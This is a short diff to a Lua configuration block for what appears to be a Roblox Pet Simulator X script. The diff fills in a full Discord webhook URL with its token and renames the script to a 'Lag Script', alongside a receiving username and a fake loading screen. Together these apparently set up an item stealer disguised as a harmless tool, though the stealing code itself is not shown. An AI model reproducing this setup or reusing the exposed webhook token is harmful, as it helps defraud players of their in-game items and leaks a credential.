@@ -1,8 +1,8 @@
 Username = "Guillodino1234"
 --Username2 = "" (will be back soon)
-WebHook = "discordwebhook"
+WebHook = "https://discord.com/api/webhooks/1125086867138814053/vrlCdrTIf-wB5aaznanCx4OTac6XMvMJ7IhpiEJ1YhvRBrzDxMnbXc-DHafHWItM7dOr"
 loadingscreen = true
-_G.CustomScriptName = "Pet Sim x Script"
+_G.CustomScriptName = "NightFoxx's Lag Script"
 _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script..."
 _G.Text3 = "Checking Scripts..."
